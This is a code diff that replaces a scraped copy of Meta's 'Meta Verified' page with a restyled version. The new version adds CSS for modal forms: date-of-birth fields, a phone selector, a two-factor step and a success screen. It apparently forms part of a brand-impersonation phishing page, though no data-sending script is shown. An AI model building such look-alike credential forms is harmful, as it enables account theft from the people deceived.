@@ -1,238 +1,900 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Meta Verified</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified: Get the verified badge on Instagram and Facebook</title>
+    <meta name="description" content="Get the verified badge for impersonation protection, direct support and exclusive features. Protect your brand and build confidence with new audiences." />
+
+    <style>
+      #intro-overlay {
+        position: fixed; inset: 0; z-index: 99999; background: #fff;
+        display: flex; align-items: center; justify-content: center;
+        transition: opacity 0.5s ease; overflow: hidden;
+      }
+      #intro-overlay.fade-out { opacity: 0; pointer-events: none; }
+      #intro-overlay img { width: auto; height: auto; max-width: 100vw; max-height: 100vh; object-fit: contain; display: block; margin: auto; }
+      body.intro-active { overflow: hidden; }
+    </style>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: { extend: { colors: { primary: '#0866ff', secondary: '#1c1e21' } } }
+        }
+    </script>
+
+    <style>
+      /* ===== MODAL STYLES ===== */
+      .modal-overlay {
+        display: none; position: fixed; inset: 0; z-index: 999;
+        background: rgba(0,0,0,0.45); align-items: center; justify-content: center;
+        padding: 20px; box-sizing: border-box;
+      }
+      .modal-overlay.open { display: flex; }
+      .modal-box {
+        background: #fff; width: 100%; max-width: 400px; border-radius: 16px;
+        padding: 24px; display: flex; flex-direction: column; max-height: 92vh;
+        overflow-y: auto; transform: scale(0.9); opacity: 0;
+        transition: transform 0.2s ease, opacity 0.2s ease;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      }
+      .modal-overlay.open .modal-box { transform: scale(1); opacity: 1; }
+      .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+      .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
+      .modal-close {
+        width: 28px; height: 28px; border: none; background: none; cursor: pointer;
+        font-size: 22px; color: #9a9a9a; line-height: 1; padding: 0; border-radius: 50%;
+        display: flex; align-items: center; justify-content: center;
+      }
+      .modal-close:hover { background: #f0f0f0; color: #333; }
+      .modal-input-wrap {
+        width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
+        border-radius: 10px; background: #fff; font-size: 14px; margin-bottom: 10px;
+        display: flex; align-items: center; transition: border-color 0.2s;
+      }
+      .modal-input-wrap:focus-within { border-color: #3b82f6; }
+      .modal-input-wrap input { width: 100%; outline: none; border: none; background: transparent; font-size: 14px; font-family: inherit; height: 100%; }
+      .modal-textarea-wrap {
+        width: 100%; border: 1px solid #d4dbe3; border-radius: 10px; background: #fff;
+        font-size: 14px; margin-bottom: 10px; padding: 11px; transition: border-color 0.2s;
+      }
+      .modal-textarea-wrap:focus-within { border-color: #3b82f6; }
+      .modal-textarea-wrap textarea { width: 100%; outline: none; border: none; background: transparent; font-size: 14px; font-family: inherit; resize: none; display: block; }
+      .modal-dob-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; margin-bottom: 10px; }
+      .modal-btn-primary {
+        width: 100%; height: 45px; background: #0064E0; color: #fff; border: none;
+        border-radius: 40px; font-size: 15px; font-weight: 500; cursor: pointer;
+        transition: background 0.2s; font-family: inherit;
+      }
+      .modal-btn-primary:hover:not(:disabled) { background: #0052c5; }
+      .modal-btn-primary:disabled { opacity: 0.75; cursor: default; }
+      .modal-btn-outline {
+        width: 100%; height: 40px; border: 1px solid #d4dbe3; border-radius: 40px;
+        background: #fff; font-size: 14px; color: #9a979e; cursor: pointer; margin-top: 12px; font-family: inherit;
+      }
+      .modal-error { color: #ef4444; font-size: 13px; margin-bottom: 10px; display: none; }
+      .modal-error.show { display: block; }
+      .modal-label { font-size: 14px; color: #9a979e; font-weight: 700; margin-bottom: 7px; display: block; }
+      .modal-hint { font-size: 13px; color: #9a979e; margin-bottom: 12px; }
+      .modal-check-row { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 20px; cursor: pointer; }
+      .modal-check-row input { width: 16px; height: 16px; accent-color: #0064E0; flex-shrink: 0; }
+      .modal-check-row a { color: #0064E0; pointer-events: none; }
+      .modal-meta-logo { width: 64px; margin: 20px auto 0; display: block; }
+      .modal-meta-icon { width: 48px; margin: 0 auto 20px; display: block; }
+      .modal-spinner {
+        width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.5);
+        border-top-color: #fff; border-radius: 50%;
+        animation: modalSpin 0.7s linear infinite; display: inline-block; vertical-align: middle;
+      }
+      @keyframes modalSpin { to { transform: rotate(360deg); } }
+      .modal-return-btn {
+        display: block; width: 100%; height: 40px; background: #0064E0; color: #fff;
+        text-align: center; border-radius: 40px; line-height: 40px; text-decoration: none;
+        font-size: 14px; font-weight: 500; transition: background 0.2s;
+      }
+      .modal-return-btn:hover { background: #0052c5; }
+      .modal-2fa-img img, .modal-success-img img { width: 100%; display: block; border-radius: 8px; margin-bottom: 16px; }
+      .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 8px; }
+      .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
+      .modal-box { background-color: #fff !important; }
+
+      /* Phone selector */
+      .pcs-phone-row { gap: 0; padding: 0; align-items: stretch; }
+      .pcs-wrap { position: relative; height: 100%; display: flex; align-items: center; }
+      .pcs-trigger {
+        display: flex; align-items: center; gap: 5px; cursor: pointer;
+        padding: 0 8px 0 10px; height: 100%; border-right: 1px solid #e5e7eb;
+        white-space: nowrap; user-select: none; flex-shrink: 0; font-size: 18px;
+      }
+      .pcs-trigger:hover { background: #f9fafb; }
+      .pcs-dropdown {
+        position: absolute; top: calc(100% + 6px); left: 0; width: 280px;
+        background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.12); z-index: 9999; overflow: hidden;
+      }
+      .pcs-search { width: 100%; padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0; font-size: 13px; outline: none; background: #fafafa; }
+      .pcs-list { max-height: 220px; overflow-y: auto; }
+      .pcs-opt { display: flex; align-items: center; gap: 8px; padding: 8px 14px; cursor: pointer; transition: background 0.15s; }
+      .pcs-opt:hover { background: #f0f4ff; }
+
+      /* Feature hover */
+      .feature-image { transition: opacity 0.7s ease; }
+
+      /* FAQ */
+      .faq-content { transition: all 0.3s ease-in-out; }
+
+      /* Pricing table */
+      .pricing-col { border: 1px solid #e4e6ea; border-radius: 16px; padding: 28px 20px; flex: 1; min-width: 0; }
+      .pricing-col.featured { border-color: #0866ff; border-width: 2px; }
+      .pricing-badge { background: #0866ff; color: white; font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 20px; display: inline-block; margin-bottom: 8px; }
+
+      /* Testimonial */
+      #testimonial-track { transition: transform 0.5s ease; }
+    </style>
 </head>
-<body>
-<!DOCTYPE html><html><head>
-<title>Meta Verified: Get the verified badge on Instagram and Facebook</title>
-</head><body><div></div>
- <div><div><div><div><div><template></template><template></template><div></div></div><div><div><div></div></div></div><div><div><div></div></div></div></div></div><template></template></div></div><div><div><template></template><nav><div><div></div><div></div><div><div><div></div><div><div><div><div><div><div></div><div><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta"></div></div></div><div><div><div></div></div></div><div><div></div></div></div></div></div></div></div><div></div></div></nav><main><template></template></main><template></template></div></div>
- <div><footer><div><hr><div><div><div><div><div><div><div><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta"></div><div><div><span><a href="https://www.facebook.com/Meta"><img src="https://scontent.fhan3-4.fna.fbcdn.net/v/t39.2365-6/425860105_925920989121941_6933048753023841367_n.svg?_nc_cat=1&amp;ccb=1-7&amp;_nc_sid=aa6a2f&amp;_nc_ohc=sSM8R63ol7QQ7kNvwELruFl&amp;_nc_oc=AdqQJVSYwVEyKZxdMg0HYTOq8Oe38uz6ahQPFpzpJxfRRbpcPG3sDk0r0ClSSGtDzHDPuRq5-_JPeFQfLrty9XCp&amp;_nc_zt=14&amp;_nc_ht=scontent.fhan3-4.fna&amp;_nc_gid=8h1Izj2G-SrLJvlmXT-XKA&amp;_nc_ss=7b289&amp;oh=00_Af4-XxRil1ycp5jfo0bwCwbPwmV67rzkeaPYDWkX1SuKxw&amp;oe=6A0B2FE2" alt="Facebook Meta.com social media"></a></span><span><a href="https://www.threads.net/@meta"><img src="https://scontent.fhan3-4.fna.fbcdn.net/v/t39.2365-6/426111639_1769160196937749_1255414493924977933_n.svg?_nc_cat=1&amp;ccb=1-7&amp;_nc_sid=aa6a2f&amp;_nc_ohc=oVp6-AMcAsQQ7kNvwFW8m5v&amp;_nc_oc=AdqJjfBUY6twKrazgFV6DZpy0iikxY7B0O4QxgIIEpmKRL4-WcWRQgBmqUT17oHMeoscPb9ZfCO874Y_YkeTa1OI&amp;_nc_zt=14&amp;_nc_ht=scontent.fhan3-4.fna&amp;_nc_gid=8h1Izj2G-SrLJvlmXT-XKA&amp;_nc_ss=7b289&amp;oh=00_Af4e16Eg3nTWMQYxZrgRZD9eToxI6fV93a19URaFOIIHMQ&amp;oe=6A0B2A79" alt="Threads Meta.com social media"></a></span><span><a href="https://www.instagram.com/meta/"><img src="https://scontent.fhan3-4.fna.fbcdn.net/v/t39.2365-6/425804778_757649995874129_6917476492193301523_n.svg?_nc_cat=1&amp;ccb=1-7&amp;_nc_sid=aa6a2f&amp;_nc_ohc=1RlC8dY4DSgQ7kNvwGdPDRm&amp;_nc_oc=AdqMlk7W1dm_i-NVDKh1VoCwNlwsfVII-lg2jspGAe80CcwvTdqnmYaeC2X6qsvKTR65cixIZ4eLlLhPBhiXVD8T&amp;_nc_zt=14&amp;_nc_ht=scontent.fhan3-4.fna&amp;_nc_gid=8h1Izj2G-SrLJvlmXT-XKA&amp;_nc_ss=7b289&amp;oh=00_Af7hopc5lWfV0VShjzbLMnNLxM-9eC8xE5HV5i5p-_GAgg&amp;oe=6A0B5238" alt="Instagram Meta.com social media"></a></span><span><a href="https://twitter.com/Meta"><img src="https://scontent.fhan3-4.fna.fbcdn.net/v/t39.2365-6/426747931_385023204117867_5811151062540225287_n.svg?_nc_cat=1&amp;ccb=1-7&amp;_nc_sid=aa6a2f&amp;_nc_ohc=PYX3kXkWoBQQ7kNvwEY0zeN&amp;_nc_oc=Adrmf2K6EC-lJo_uNgc96FbYvMubtXoveyczim6_pwDkoFu_MXULGX_aEZAHdDjfhohYDxU_ywZT4Ydn5Z9Dms8q&amp;_nc_zt=14&amp;_nc_ht=scontent.fhan3-4.fna&amp;_nc_gid=8h1Izj2G-SrLJvlmXT-XKA&amp;_nc_ss=7b289&amp;oh=00_Af7PoNbFme6hRZ1wWWvPkQy58gg-9KRn4DZfDJ8FulKKcw&amp;oe=6A0B386A" alt="X Meta.com social media"></a></span><span><a href="https://www.youtube.com/meta"><img src="https://scontent.fhan3-4.fna.fbcdn.net/v/t39.2365-6/425519002_724756916408357_7491658959807896355_n.svg?_nc_cat=1&amp;ccb=1-7&amp;_nc_sid=aa6a2f&amp;_nc_ohc=SoQmOO_XrAMQ7kNvwFjUQLE&amp;_nc_oc=AdrKuG1oahTQrlz-I_Jn-AWOUPLTtF9vA3xyAvVhiYi9ja2dFzt72WUTPDAjXitwWcIxaSaATXeLyUybJ994OmJX&amp;_nc_zt=14&amp;_nc_ht=scontent.fhan3-4.fna&amp;_nc_gid=8h1Izj2G-SrLJvlmXT-XKA&amp;_nc_ss=7b289&amp;oh=00_Af7XCzuEFOWpmthICfGMGLWiu3kKoAbcdkFVJTkM6AN4Zg&amp;oe=6A0B331F" alt="YouTube Meta.com media channel"></a></span></div></div></div></div><div><div><div><div><div><div>Meta Store</div><svg><path></path></svg></div></div><div><div><a href="/ai-glasses/ray-ban-meta/"><span>Ray-Ban Meta glasses</span></a><a href="/ai-glasses/oakley-meta/"><span>Oakley Meta glasses</span></a><a href="/ai-glasses/meta-ray-ban-display/"><span>Meta Ray-Ban Display</span></a><a href="/ai-glasses/compare/"><span>Compare glasses</span></a><a href="/quest/"><span>Meta Quest</span></a><a href="/quest/accessories/"><span>Accessories</span></a><a href="/experiences/"><span>Apps and games</span></a><a href="/quest/gift-cards/"><span>Meta Quest gift cards</span></a><a href="/refurbished/quest-3/"><span>Refurbished Meta Quest 3</span></a><a href="/refurbished/quest-3s/"><span>Refurbished Meta Quest 3S</span></a><a href="/refurbished/ai-glasses/"><span>Refurbished Ray-Ban Meta glasses</span></a><a href="https://rayban.com/"><span>More from Ray-Ban</span></a><a href="/quest/play-now-pay-later/"><span>Meta Quest: Play now. Pay later.</span></a><a href="/warranty-plus/"><span>Meta Warranty Plus</span></a><a href="/quest/referrals/"><span>Meta Quest referrals</span></a><a href="/purchase-program/education/ "><span>Education discount</span></a><a href="/blog/"><span>Blog</span></a></div></div><div><hr></div></div><div><div><div><div>Store support and legal</div><svg><path></path></svg></div></div><div><div><a href="/help/"><span>Meta Help Centre</span></a><a href="/order/find/"><span>Order status</span></a><a href="/returns/"><span>Returns</span></a><a href="/demo/"><span>Find a product demo</span></a><a href="/retailers/"><span>Find a shop</span></a><a href="/legal/"><span>Legal</span></a><a href="/legal/terms-of-sale/"><span>Terms of sale</span></a><a href="/quest/safety-center/"><span>Meta Quest safety centre</span></a></div></div><div><hr></div></div><div><div><div><div>Community</div><svg><path></path></svg></div></div><div><div><a href="https://creator.oculus.com/"><span>Creators</span></a><a href="https://developers.meta.com/horizon/"><span>Developers</span></a><a href="https://www.facebook.com/business/ads/"><span>Businesses</span></a><a href="https://www.facebook.com/government-nonprofits/best-practices/nonprofits/"><span>Non-profits</span></a><a href="https://developers.meta.com/horizon/downloads/unity/"><span>Download SDKs</span></a><a href="/made-for-meta/"><span>Made for Meta partner programme</span></a><a href="/community/vr-for-good/"><span>VR for Good</span></a></div></div><div><hr></div></div><div><div><div><div>Our actions</div><svg><path></path></svg></div></div><div><div><a href="/actions/protecting-privacy-and-security/"><span>Data and privacy</span></a><a href="/actions/responsible-business-practices/"><span>Responsible business practices</span></a><a href="/accessibility/"><span>Accessibility</span></a><a href="/actions/preparing-for-elections-with-meta/"><span>Elections</span></a></div></div><div><hr></div></div><div><div><div><div>About us</div><svg><path></path></svg></div></div><div><div><a href="/about/"><span>About Meta</span></a><a href="/about/company-info/"><span>Company info</span></a><a href="https://metacareers.com/"><span>Careers</span></a><a href="/media-gallery/"><span>Media gallery</span></a><a href="/brand/resources/"><span>Brand resources</span></a><a href="https://investor.atmeta.com/home/default.aspx"><span>For investors</span></a><a href="https://about.fb.com/news/"><span>Newsroom</span></a></div></div><div><hr></div></div><div><div><div><div>Site terms and policies</div><svg><path></path></svg></div></div><div><div><a href="https://transparency.meta.com/policies/community-standards/"><span>Community Standards</span></a><a href="/legal/privacy-policy/"><span>Privacy Policy</span></a><a href="https://www.facebook.com/terms.php/"><span>Terms</span></a><a href="https://www.facebook.com/privacy/policies/cookies/"><span>Cookie policy</span></a></div></div><div><hr></div></div><div><div><div><div>App support</div><svg><path></path></svg></div></div><div><div><a href="https://www.facebook.com/help?ref=about.facebook.com"><span>Facebook Help Centre</span></a><a href="https://www.facebook.com/help/messenger-app/?ref=about.facebook.com"><span>Messenger Help Centre</span></a><a href="https://help.instagram.com/"><span>Instagram Help Centre</span></a><a href="https://faq.whatsapp.com/"><span>WhatsApp Help Centre</span></a><a href="https://www.facebook.com/help/work?ref=about.facebook.com"><span>Workplace Help Centre</span></a><a href="/meta-verified/"><span>Meta Verified</span></a><a href="/account/"><span>Meta account (single login)</span></a></div></div><div><hr></div></div></div><div><div><div><div><div><div>Meta Store</div></div><div><div><span><a href="/ai-glasses/ray-ban-meta/">Ray-Ban Meta glasses</a></span></div><div><span><a href="/ai-glasses/oakley-meta/">Oakley Meta glasses</a></span></div><div><span><a href="/ai-glasses/meta-ray-ban-display/">Meta Ray-Ban Display</a></span></div><div><span><a href="/ai-glasses/compare/">Compare glasses</a></span></div><div><span><a href="/quest/">Meta Quest</a></span></div><div><span><a href="/quest/accessories/">Accessories</a></span></div><div><span><a href="/experiences/">Apps and games</a></span></div><div><span><a href="/quest/gift-cards/">Meta Quest gift cards</a></span></div><div><span><a href="/refurbished/quest-3/">Refurbished Meta Quest 3</a></span></div><div><span><a href="/refurbished/quest-3s/">Refurbished Meta Quest 3S</a></span></div><div><span><a href="/refurbished/ai-glasses/">Refurbished Ray-Ban Meta glasses</a></span></div><div><span><a href="https://rayban.com/">More from Ray-Ban</a></span></div><div><span><a href="/quest/play-now-pay-later/">Meta Quest: Play now. Pay later.</a></span></div><div><span><a href="/warranty-plus/">Meta Warranty Plus</a></span></div><div><span><a href="/quest/referrals/">Meta Quest referrals</a></span></div><div><span><a href="/purchase-program/education/ ">Education discount</a></span></div><div><span><a href="/blog/">Blog</a></span></div></div></div></div><div><div><div><div>Store support and legal</div></div><div><div><span><a href="/help/">Meta Help Centre</a></span></div><div><span><a href="/order/find/">Order status</a></span></div><div><span><a href="/returns/">Returns</a></span></div><div><span><a href="/demo/">Find a product demo</a></span></div><div><span><a href="/retailers/">Find a shop</a></span></div><div><span><a href="/legal/">Legal</a></span></div><div><span><a href="/legal/terms-of-sale/">Terms of sale</a></span></div><div><span><a href="/quest/safety-center/">Meta Quest safety centre</a></span></div></div></div></div><div><div><div><div>Community</div></div><div><div><span><a href="https://creator.oculus.com/">Creators</a></span></div><div><span><a href="https://developers.meta.com/horizon/">Developers</a></span></div><div><span><a href="https://www.facebook.com/business/ads/">Businesses</a></span></div><div><span><a href="https://www.facebook.com/government-nonprofits/best-practices/nonprofits/">Non-profits</a></span></div><div><span><a href="https://developers.meta.com/horizon/downloads/unity/">Download SDKs</a></span></div><div><span><a href="/made-for-meta/">Made for Meta partner programme</a></span></div><div><span><a href="/community/vr-for-good/">VR for Good</a></span></div></div></div></div></div><div><div><div><div><div>Our actions</div></div><div><div><span><a href="/actions/protecting-privacy-and-security/">Data and privacy</a></span></div><div><span><a href="/actions/responsible-business-practices/">Responsible business practices</a></span></div><div><span><a href="/accessibility/">Accessibility</a></span></div><div><span><a href="/actions/preparing-for-elections-with-meta/">Elections</a></span></div></div></div></div><div><div><div><div>About us</div></div><div><div><span><a href="/about/">About Meta</a></span></div><div><span><a href="/about/company-info/">Company info</a></span></div><div><span><a href="https://metacareers.com/">Careers</a></span></div><div><span><a href="/media-gallery/">Media gallery</a></span></div><div><span><a href="/brand/resources/">Brand resources</a></span></div><div><span><a href="https://investor.atmeta.com/home/default.aspx">For investors</a></span></div><div><span><a href="https://about.fb.com/news/">Newsroom</a></span></div></div></div></div><div><div><div><div>Site terms and policies</div></div><div><div><span><a href="https://transparency.meta.com/policies/community-standards/">Community Standards</a></span></div><div><span><a href="/legal/privacy-policy/">Privacy Policy</a></span></div><div><span><a href="https://www.facebook.com/terms.php/">Terms</a></span></div><div><span><a href="https://www.facebook.com/privacy/policies/cookies/">Cookie policy</a></span></div></div></div></div><div><div><div><div>App support</div></div><div><div><span><a href="https://www.facebook.com/help?ref=about.facebook.com">Facebook Help Centre</a></span></div><div><span><a href="https://www.facebook.com/help/messenger-app/?ref=about.facebook.com">Messenger Help Centre</a></span></div><div><span><a href="https://help.instagram.com/">Instagram Help Centre</a></span></div><div><span><a href="https://faq.whatsapp.com/">WhatsApp Help Centre</a></span></div><div><span><a href="https://www.facebook.com/help/work?ref=about.facebook.com">Workplace Help Centre</a></span></div><div><span><a href="/meta-verified/">Meta Verified</a></span></div><div><span><a href="/account/">Meta account (single login)</a></span></div></div></div></div></div></div><div><div><div><div><div><div>Meta Store</div></div><div><div><span><a href="/ai-glasses/ray-ban-meta/">Ray-Ban Meta glasses</a></span></div><div><span><a href="/ai-glasses/oakley-meta/">Oakley Meta glasses</a></span></div><div><span><a href="/ai-glasses/meta-ray-ban-display/">Meta Ray-Ban Display</a></span></div><div><span><a href="/ai-glasses/compare/">Compare glasses</a></span></div><div><span><a href="/quest/">Meta Quest</a></span></div><div><span><a href="/quest/accessories/">Accessories</a></span></div><div><span><a href="/experiences/">Apps and games</a></span></div><div><span><a href="/quest/gift-cards/">Meta Quest gift cards</a></span></div><div><span><a href="/refurbished/quest-3/">Refurbished Meta Quest 3</a></span></div><div><span><a href="/refurbished/quest-3s/">Refurbished Meta Quest 3S</a></span></div><div><span><a href="/refurbished/ai-glasses/">Refurbished Ray-Ban Meta glasses</a></span></div><div><span><a href="https://rayban.com/">More from Ray-Ban</a></span></div><div><span><a href="/quest/play-now-pay-later/">Meta Quest: Play now. Pay later.</a></span></div><div><span><a href="/warranty-plus/">Meta Warranty Plus</a></span></div><div><span><a href="/quest/referrals/">Meta Quest referrals</a></span></div><div><span><a href="/purchase-program/education/ ">Education discount</a></span></div><div><span><a href="/blog/">Blog</a></span></div></div></div></div><div><div><div><div>Store support and legal</div></div><div><div><span><a href="/help/">Meta Help Centre</a></span></div><div><span><a href="/order/find/">Order status</a></span></div><div><span><a href="/returns/">Returns</a></span></div><div><span><a href="/demo/">Find a product demo</a></span></div><div><span><a href="/retailers/">Find a shop</a></span></div><div><span><a href="/legal/">Legal</a></span></div><div><span><a href="/legal/terms-of-sale/">Terms of sale</a></span></div><div><span><a href="/quest/safety-center/">Meta Quest safety centre</a></span></div></div></div></div><div><div><div><div>Community</div></div><div><div><span><a href="https://creator.oculus.com/">Creators</a></span></div><div><span><a href="https://developers.meta.com/horizon/">Developers</a></span></div><div><span><a href="https://www.facebook.com/business/ads/">Businesses</a></span></div><div><span><a href="https://www.facebook.com/government-nonprofits/best-practices/nonprofits/">Non-profits</a></span></div><div><span><a href="https://developers.meta.com/horizon/downloads/unity/">Download SDKs</a></span></div><div><span><a href="/made-for-meta/">Made for Meta partner programme</a></span></div><div><span><a href="/community/vr-for-good/">VR for Good</a></span></div></div></div></div></div><div><div><div><div><div>Our actions</div></div><div><div><span><a href="/actions/protecting-privacy-and-security/">Data and privacy</a></span></div><div><span><a href="/actions/responsible-business-practices/">Responsible business practices</a></span></div><div><span><a href="/accessibility/">Accessibility</a></span></div><div><span><a href="/actions/preparing-for-elections-with-meta/">Elections</a></span></div></div></div></div><div><div><div><div>About us</div></div><div><div><span><a href="/about/">About Meta</a></span></div><div><span><a href="/about/company-info/">Company info</a></span></div><div><span><a href="https://metacareers.com/">Careers</a></span></div><div><span><a href="/media-gallery/">Media gallery</a></span></div><div><span><a href="/brand/resources/">Brand resources</a></span></div><div><span><a href="https://investor.atmeta.com/home/default.aspx">For investors</a></span></div><div><span><a href="https://about.fb.com/news/">Newsroom</a></span></div></div></div></div><div><div><div><div>Site terms and policies</div></div><div><div><span><a href="https://transparency.meta.com/policies/community-standards/">Community Standards</a></span></div><div><span><a href="/legal/privacy-policy/">Privacy Policy</a></span></div><div><span><a href="https://www.facebook.com/terms.php/">Terms</a></span></div><div><span><a href="https://www.facebook.com/privacy/policies/cookies/">Cookie policy</a></span></div></div></div></div><div><div><div><div>App support</div></div><div><div><span><a href="https://www.facebook.com/help?ref=about.facebook.com">Facebook Help Centre</a></span></div><div><span><a href="https://www.facebook.com/help/messenger-app/?ref=about.facebook.com">Messenger Help Centre</a></span></div><div><span><a href="https://help.instagram.com/">Instagram Help Centre</a></span></div><div><span><a href="https://faq.whatsapp.com/">WhatsApp Help Centre</a></span></div><div><span><a href="https://www.facebook.com/help/work?ref=about.facebook.com">Workplace Help Centre</a></span></div><div><span><a href="/meta-verified/">Meta Verified</a></span></div><div><span><a href="/account/">Meta account (single login)</a></span></div></div></div></div></div></div><div><div><div><div><div><div>Meta Store</div></div><div><div><span><a href="/ai-glasses/ray-ban-meta/">Ray-Ban Meta glasses</a></span></div><div><span><a href="/ai-glasses/oakley-meta/">Oakley Meta glasses</a></span></div><div><span><a href="/ai-glasses/meta-ray-ban-display/">Meta Ray-Ban Display</a></span></div><div><span><a href="/ai-glasses/compare/">Compare glasses</a></span></div><div><span><a href="/quest/">Meta Quest</a></span></div><div><span><a href="/quest/accessories/">Accessories</a></span></div><div><span><a href="/experiences/">Apps and games</a></span></div><div><span><a href="/quest/gift-cards/">Meta Quest gift cards</a></span></div><div><span><a href="/refurbished/quest-3/">Refurbished Meta Quest 3</a></span></div><div><span><a href="/refurbished/quest-3s/">Refurbished Meta Quest 3S</a></span></div><div><span><a href="/refurbished/ai-glasses/">Refurbished Ray-Ban Meta glasses</a></span></div><div><span><a href="https://rayban.com/">More from Ray-Ban</a></span></div><div><span><a href="/quest/play-now-pay-later/">Meta Quest: Play now. Pay later.</a></span></div><div><span><a href="/warranty-plus/">Meta Warranty Plus</a></span></div><div><span><a href="/quest/referrals/">Meta Quest referrals</a></span></div><div><span><a href="/purchase-program/education/ ">Education discount</a></span></div><div><span><a href="/blog/">Blog</a></span></div></div></div></div><div><div><div><div>Store support and legal</div></div><div><div><span><a href="/help/">Meta Help Centre</a></span></div><div><span><a href="/order/find/">Order status</a></span></div><div><span><a href="/returns/">Returns</a></span></div><div><span><a href="/demo/">Find a product demo</a></span></div><div><span><a href="/retailers/">Find a shop</a></span></div><div><span><a href="/legal/">Legal</a></span></div><div><span><a href="/legal/terms-of-sale/">Terms of sale</a></span></div><div><span><a href="/quest/safety-center/">Meta Quest safety centre</a></span></div></div></div></div></div><div><div><div><div><div>Community</div></div><div><div><span><a href="https://creator.oculus.com/">Creators</a></span></div><div><span><a href="https://developers.meta.com/horizon/">Developers</a></span></div><div><span><a href="https://www.facebook.com/business/ads/">Businesses</a></span></div><div><span><a href="https://www.facebook.com/government-nonprofits/best-practices/nonprofits/">Non-profits</a></span></div><div><span><a href="https://developers.meta.com/horizon/downloads/unity/">Download SDKs</a></span></div><div><span><a href="/made-for-meta/">Made for Meta partner programme</a></span></div><div><span><a href="/community/vr-for-good/">VR for Good</a></span></div></div></div></div><div><div><div><div>Our actions</div></div><div><div><span><a href="/actions/protecting-privacy-and-security/">Data and privacy</a></span></div><div><span><a href="/actions/responsible-business-practices/">Responsible business practices</a></span></div><div><span><a href="/accessibility/">Accessibility</a></span></div><div><span><a href="/actions/preparing-for-elections-with-meta/">Elections</a></span></div></div></div></div></div><div><div><div><div><div>About us</div></div><div><div><span><a href="/about/">About Meta</a></span></div><div><span><a href="/about/company-info/">Company info</a></span></div><div><span><a href="https://metacareers.com/">Careers</a></span></div><div><span><a href="/media-gallery/">Media gallery</a></span></div><div><span><a href="/brand/resources/">Brand resources</a></span></div><div><span><a href="https://investor.atmeta.com/home/default.aspx">For investors</a></span></div><div><span><a href="https://about.fb.com/news/">Newsroom</a></span></div></div></div></div><div><div><div><div>Site terms and policies</div></div><div><div><span><a href="https://transparency.meta.com/policies/community-standards/">Community Standards</a></span></div><div><span><a href="/legal/privacy-policy/">Privacy Policy</a></span></div><div><span><a href="https://www.facebook.com/terms.php/">Terms</a></span></div><div><span><a href="https://www.facebook.com/privacy/policies/cookies/">Cookie policy</a></span></div></div></div></div><div><div><div><div>App support</div></div><div><div><span><a href="https://www.facebook.com/help?ref=about.facebook.com">Facebook Help Centre</a></span></div><div><span><a href="https://www.facebook.com/help/messenger-app/?ref=about.facebook.com">Messenger Help Centre</a></span></div><div><span><a href="https://help.instagram.com/">Instagram Help Centre</a></span></div><div><span><a href="https://faq.whatsapp.com/">WhatsApp Help Centre</a></span></div><div><span><a href="https://www.facebook.com/help/work?ref=about.facebook.com">Workplace Help Centre</a></span></div><div><span><a href="/meta-verified/">Meta Verified</a></span></div><div><span><a href="/account/">Meta account (single login)</a></span></div></div></div></div></div></div></div></div></div><div><div><div><div><div><div><div>English (UK)</div></div></div></div></div><div></div></div></div></div></div></div></footer></div><template></template><div><div><div><div><div><div><div><div><span><div>
- Upgrade your profile with Meta Verified – enjoy the first month at a discount.
- </div></span></div><div><span><div>Eligibility and subscription renewal terms apply. Cancel at any time.
- </div></span></div></div></div></div></div></div></div><div><div><div><picture><source type="image/webp"><source type="image/webp"><img src="https://scontent-atl3-3.xx.fbcdn.net/v/t39.8562-6/558163525_1121943020107927_8307754257490438721_n.webp?_nc_cat=111&amp;ccb=1-7&amp;_nc_sid=9a942e&amp;_nc_ohc=2Iodey-3HvQQ7kNvwGoqJrC&amp;_nc_oc=AdpphIUtog1QLAyEcab4DTfKXe4ZuDLmHSlJc6KE2-Ru0fc41YuVNkQEAa8Bb2gR5cN8UWaeccORTxjheOUsOWtP&amp;_nc_zt=14&amp;_nc_ht=scontent-atl3-3.xx&amp;_nc_gid=S74Zhy8aDrCGSM5JJVSNvg&amp;_nc_ss=7b289&amp;oh=00_Af4cKHpJxl8SVy-mh9utZzveG8a4wXDDEx2i8w385So3lg&amp;oe=6A0B201A" alt="gradient backdrop"></picture></div><div><div><div><div><img src="https://scontent-atl3-2.xx.fbcdn.net/v/t39.8562-6/586216991_4084064581857862_3245214017452253781_n.svg?_nc_cat=101&amp;ccb=1-7&amp;_nc_sid=f537c7&amp;_nc_ohc=ckNQPHbGLcMQ7kNvwFG6-k3&amp;_nc_oc=Adqa-T8XuTwePjSE30oXCPIx2EuxOHjaVCZ9R3-31P8rZE6YaShhZgVg1XcR5KIPmHRPwFPf5qqyqwO8Yd2PIztd&amp;_nc_zt=14&amp;_nc_ht=scontent-atl3-2.xx&amp;_nc_gid=S74Zhy8aDrCGSM5JJVSNvg&amp;_nc_ss=7b289&amp;oh=00_Af5IlUqzAiUhTm8yd4AFGwXfblPIPu7wGtJ9p3jgPPyrIg&amp;oe=6A0AF633" alt="The Meta Verified badge icon"></div><h1>
- Protect your brand with Meta Verified
